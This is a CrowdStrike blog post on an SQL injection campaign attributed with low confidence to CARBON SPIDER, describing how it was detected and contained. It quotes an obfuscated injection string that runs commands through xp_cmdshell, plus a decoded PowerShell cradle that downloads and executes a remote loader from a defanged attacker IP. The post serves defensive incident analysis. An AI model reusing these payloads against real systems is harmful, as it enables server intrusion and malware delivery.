        <h1>Squashing SPIDERS: Threat Intelligence, Threat Hunting and Rapid Response Stops SQL Injection Campaign</h1>
        
        <div class="publish_info">
            <p>August 03, 2021</p>
            <span>|</span>
            <a href="/en-us/blog/author.michael-decristofaro---eric-loui---josh-reynolds/" title="Posts by Michael DeCristofaro - Eric Loui - Josh Reynolds" rel="author">
                Michael DeCristofaro - Eric Loui - Josh Reynolds</a>
            <span>|</span>
                
            <a href="/en-us/blog/category.from-the-front-lines/" title="From The Front Lines">From The Front Lines</a>
        </div>
        <div class="post_image">
            <img width="1060" height="698" src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-91-us?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="/content/dam/crowdstrike/www/en-us/wp/2024/12/Blog_1060x698-91-us.jpeg 1060w" sizes="(max-width: 1060px) 100vw, 1060px"/>
        </div>

<div class="text text--blog-content aem-GridColumn aem-GridColumn--default--12">



<div class="cmp-text" id="text-04b2c092b1" data-cmp-name="cmp-text-" data-cmp-is="text" data-target-location="false">
    
       <span><span style="	font-weight: 400;
">In this blog, we describe a campaign of recent activity where CrowdStrike observed an actor likely related to </span><a href="https://adversary.crowdstrike.com/en-US/adversary/carbon-spider.html"><span style="	font-weight: 400;
">CARBON SPIDER</span></a><span style="	font-weight: 400;
"> performing SQL injections in order to gain code execution as an initial infection vector. A combined effort from Falcon Complete™ (managed detection and response), Falcon OverWatch™ (managed threat hunting), and CrowdStrike Intelligence uncovered this campaign. The attack demonstrates how CARBON SPIDER has likely introduced new tactics, techniques and procedures (TTPs) following the actor’s apparent </span><a href="/en-us/blog/how-ransomware-adversaries-reacted-to-the-darkside-pipeline-attack/"><span style="	font-weight: 400;
">termination of the </span><em><span style="	font-weight: 400;
">Darkside</span></em><span style="	font-weight: 400;
"> ransomware-as-a-Service program</span></a><span style="	font-weight: 400;
"> in response to scrutiny following the </span><a href="/en-us/blog/falcon-protects-from-darkside-ransomware/"><span style="	font-weight: 400;
">Colonial Pipeline Darkside incident</span></a><span style="	font-weight: 400;
">.</span>

<span style="	font-weight: 400;
">Collaboration between Falcon Complete, Falcon OverWatch and CrowdStrike Intelligence is a force multiplier protecting customers from the latest threats. Leveraging Falcon OverWatch and their expert threat hunters, Falcon Complete is able to perform timely surgical remediation, extract important artifacts, and ultimately stop breaches.</span>

<span style="	font-weight: 400;
">Partnering with CrowdStrike Intelligence allows these teams to take advantage of incident attribution, such as understanding adversary motives (targeted, financial, or </span><a href="/en-us/cybersecurity-101/threat-intelligence/hacktivism/"><span style="	font-weight: 400;
">hacktivism</span></a><span style="	font-weight: 400;
">), their Tactics, Techniques, and Procedures (TTPs), as well as enabling proactive discovery of actor Indicators of Attack and Indicators of Compromise to keep customers safe. Knowing an adversary and their intent is powerful knowledge during the triage and remediation process to best track past activity and anticipate future actions.<p> </p></span>
<h2><span style="	font-weight: 400;
">Falcon Complete Investigates and Responds</span></h2>

">Demux</span></em><span style="	font-weight: 400;
"> PowerShell loaders and the stager DLLs during CARBON SPIDER-related activity. Based on the current available evidence, it is assessed with low confidence that this activity originates from CARBON SPIDER.</span>

<span style="	font-weight: 400;
">For Falcon OverWatch and Falcon Complete on the frontlines, attribution is an important piece of information to take into account. In this case, CARBON SPIDER is a financially motivated eCrime actor, who has recently been conducting high profile Big Game Hunting ransomware campaigns. Attribution from CrowdStrike Intelligence allows Threat Hunters and MDR Analysts understand the adversary&#39;s intent and investigate for Tactics, Techniques, and Procedures commonly used by the known threat actor.<p> </p></span>

<span style="	font-weight: 400;
">Concurrently to collaborating with CrowdStrike Intelligence, Falcon Complete was still triaging and responding to the active incident in the customer environment. By this point the SQL server had been network contained and further investigation into the initial access vector was underway.</span>
<h3><span style="	font-weight: 400;
">Pivoting to the Web Server to Confirm Initial Access Vector</span></h3>
<span style="	font-weight: 400;
">After reviewing the initial OverWatch alert, Falcon Complete pivoted to reviewing the IIS logs from the customer’s web server at the time of the incident to confirm the initial access vector as SQL Injection.<p> </p> Through analysis of the logs, Falcon Complete confirmed that the actor used</span><span style="	font-weight: 400;
"> the SQL </span><span style="	font-weight: 400;
"><code>xp_cmdshell</code></span><span style="	font-weight: 400;
"> command to execute multiple PowerShell (PS) payloads.</span>

<span style="	font-weight: 400;
">In an attempt to hide their intent and to possibly bypass security technologies, such as web-application firewalls, the actor made use of multiple encoding techniques within the SQL-injection statements. An example injection can be found here:</span>
<ul><li>
<pre><code>‘;dEClarE &#64;czyd VaRcHar(8000);SEt &#64;czyd&#61;0x6563686f2031;iNsERt inTo SqLMaPoUtPUT(data) eXec master..xp_cmdshell &#64;czyd--</code></pre>
</li></ul>
This injection finishes the legitimate SQL statement using a single quote (‘), proceeds to create the variable named <code>czyd</code>, sets its contents to the hexadecimal-encoded value of <code>0x6563686f2031</code> (which decodes to <code>echo 1</code>), and executes the variable using <code>eXec master..xp_cmdshell &#64;czyd</code>. The use of <code>iNsERt inTo SqLMaPoUtPUT(data)</code> indicates the actor likely leveraged the <em>sqlmap</em> tool to perform automated SQL injection against the target web application.

<span style="	font-weight: 400;
">CARBON SPIDER’s PowerShell payloads were executed using the encoding patterns described above within additional SQL-injection statements.</span>

<span style="	font-weight: 400;
">An interesting artifact recovered from the web server IIS logs showed the actor’s failed attempts to continue exploitation after the SQL server was network contained. After their remote download was blocked, the actor attempted to echo the </span><em><span style="	font-weight: 400;
">Demux</span></em><span style="	font-weight: 400;
"> PowerShell content into a file to execute, however the command failed due to the SQL server being contained. By reviewing the IIS logs, Falcon Complete was then able to provide the customer with specific information on the SQL Injection Vulnerabilities, and provide them with key information for fixing the vulnerable web page.</span>

<span style="	font-weight: 400;
">Falcon Complete began response within 6 minutes, contained the threat in under 30 minutes, and fully remediated the host within 1 hour and 45 minutes, with active support from Falcon OverWatch and CrowdStrike Intel. By stopping the breach before the actor could achieve their goals and cause any significant impact, Falcon Complete again demonstrated the critical importance of rapid response.</span>

<h2><span style="	font-weight: 400;
">Additional OverWatch Observations</span></h2>
<span style="	font-weight: 400;
">CrowdStrike Falcon® OverWatch observed a similar incident, in which successful SQL injection led to execution of encoded PowerShell commands. The commands decoded to:</span>
<ul><li>
<pre><code>$p&#61;((New-Object Net.WebClient).DownloadString(&#39;http&lt;:&gt;//46.17.105&lt;.&gt;207/lzbt6001sop_64refl.ps1&#39;));$p|.(&#39;IeX&#39;)</code></pre>
</li></ul>
This command downloaded a <em>Demux</em> PowerShell loader, which loads a DLL into memory. This DLL used the same IP addresses <code>46.17.105&lt;.&gt;207</code> and <code>185.242.85&lt;.&gt;126</code> for C2 communications.

<span style="	font-weight: 400;
">In addition to the PowerShell download cradle, OverWatch also observed the actor using the same </span><span style="	font-weight: 400;
"><code>echo 1</code></span><span style="	font-weight: 400;
"> and </span><span style="	font-weight: 400;
"><code>ping</code></span><span style="	font-weight: 400;
"> commands, as well as </span><span style="	font-weight: 400;
"><code>wmic</code></span><span style="	font-weight: 400;
"> to query the domain name.</span>
<ul><li style="	font-weight: 400;
"><span style="	font-weight: 400;
"><code>echo 1</code></span></li><li style="	font-weight: 400;
"><span style="	font-weight: 400;
"><code>ping -n 10 127.0.0.1</code></span></li><li style="	font-weight: 400;
"><span style="	font-weight: 400;
"><code>wmic<p> </p> ComputerSystem get domain</code></span></li></ul>
<h2><span style="	font-weight: 400;
">Conclusion</span></h2>
<span style="	font-weight: 400;
">This incident described in this blog is attributed with low confidence to CARBON SPIDER, based on use of the </span><em><span style="	font-weight: 400;
">Demux</span></em><span style="	font-weight: 400;
"> Loader and stager DLL combination. CARBON SPIDER’s likely use of <a href="/cybersecurity-101/sql-injection.html">SQL injection</a> as an initial access method represents a new development, marking a departure from the typical indiscriminate spam campaigns the actor continues to conduct. Gaining code execution on an MSSQL server within an environment could provide an avenue for the actor to move laterally into the corporate network if compromised servers are not located in a Demilitarized Zone (DMZ).</span>

<span style="	font-weight: 400;
">This campaign demonstrates CARBON SPIDER’s willingness and ability to introduce different TTPs in order to compromise victims. It is likely the actor will continue to leverage both spam and server exploitation to achieve initial access in the near-term.</span>
